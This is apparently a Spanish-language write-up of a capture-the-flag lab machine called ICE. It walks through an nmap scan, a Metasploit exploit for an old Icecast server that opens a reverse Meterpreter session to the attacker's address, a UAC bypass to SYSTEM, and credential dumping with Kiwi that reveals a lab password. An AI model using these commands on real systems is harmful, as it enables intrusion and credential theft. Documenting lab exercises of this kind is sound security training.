---
layout: default
---

# MÃ¡quina ICE

##

## Fase 1: Reconocimiento (Reconnaissance)

**Objetivo:** Identificar servicios y versiones vulnerables.

1. **Comando:** `sudo nmap -p- --open -sS -Pn -sV -sC --min-rate 5000 [IP_VICTIMA]`
- `p-`: Escaneo de todos los puertos.
- `-open`: Muestra solo puertos con estado abierto.
- `sS`: TCP SYN Scan (Stealth) para mayor velocidad y discreciÃ³n.
- `Pn`: Omite el descubrimiento de host (evita bloqueos de ICMP/Ping).
- `sV / -sC`: DetecciÃ³n de versiones y ejecuciÃ³n de scripts por defecto.
1. **Servicio CrÃ­tico:** Icecast en el puerto **8000**.
2. El resultado del Nmap donde se vea el puerto 8000/tcp abierto con la versiÃ³n `Icecast streaming media server`. (Referencia: `image_b9ddb0.jpg`).

### **Evidencia Visual**

![image.png](image.png)

## Fase 2: AnÃ¡lisis de Vulnerabilidades

**Objetivo:** Encontrar el exploit adecuado para la versiÃ³n detectada.

1. **Comando:** `searchsploit icecast`
2. **MÃ³dulo MSF:** `exploit/windows/http/icecast_header` (CVE-2004-1561).
3. El terminal con los resultados de `searchsploit` resaltando el exploit de Metasploit. (Referencia: `image_5453a6.png`).

### **4. Evidencia Visual**

![image.png](image%201.png)

##

## Fase 3: ExplotaciÃ³n Controlada (Acceso Inicial)

**Objetivo:** Obtener una sesiÃ³n de Meterpreter como usuario de bajos privilegios.

1. **Comandos:**Bash
    
    ```bash
    msfconsole -q<br>use exploit/windows/http/icecast_header<br>set RHOSTS [IP_VICTIMA]<br>set LHOST [TU_IP_VPN]<br>exploit
    ```
    
2. **VerificaciÃ³n:** Ejecutar `getuid` y `sysinfo` al recibir la sesiÃ³n.
3. El banner de "Meterpreter session 1 opened" y la info de `sysinfo` mostrando `Windows 7 (64 bit)`. (Referencia: `image_afdda0.png`).

### 3. Evidencia Visual

![image.png](image%202.png)

## Fase 4: Escalada de Privilegios

**Objetivo:** Saltar el UAC y convertirse en SYSTEM.

1. **Comandos:**Bash
    
    ```bash
    background<br>use exploit/windows/local/bypassuac_eventvwr<br>set SESSION 1<br>set LHOST [TU_IP_VPN]<br>set LPORT 4445<br>run
    ```
    
2. **Elevar Privilegios:** En la nueva sesiÃ³n (SesiÃ³n 2), ejecutar: `getsystem`.
3. El comando `getsystem` confirmando "...got system via technique 1". (Referencia: Tu registro de terminal previo).

![image.png](image%203.png)

## Fase 5: Post-ExplotaciÃ³n y Credenciales

**Objetivo:** Estabilizar la sesiÃ³n y extraer contraseÃ±as.

1. **MigraciÃ³n (Vital):** Debido a que el sistema es x64, hay que moverse a un proceso nativo.
    - Comando: `ps`
    - Comando: `migrate 1384` (O el PID de `spoolsv.exe`).

1. **ExtracciÃ³n con Kiwi:**Bash
    
    ```bash
    load kiwi<br>creds_all<br>hashdump
    ```
    
2. La tabla de `wdigest credentials` mostrando el usuario `Dark` y su contraseÃ±a `Password01!`. (Referencia: Tu ejecuciÃ³n exitosa de `creds_all`).

![image.png](image%204.png)

### 6. Comandos de VerificaciÃ³n Final

Una vez que `getsystem` haya funcionado, ejecuta estos tres comandos juntos:

- **Comando:** `getuid`
    - *Debe responder:* `Server username: NT AUTHORITY\SYSTEM`
- **Comando:** `getprivs`
    - *Debe mostrar una lista larga. Busca `SeDebugPrivilege` o `SeTakeOwnershipPrivilege`*

![image.png](image%205.png)
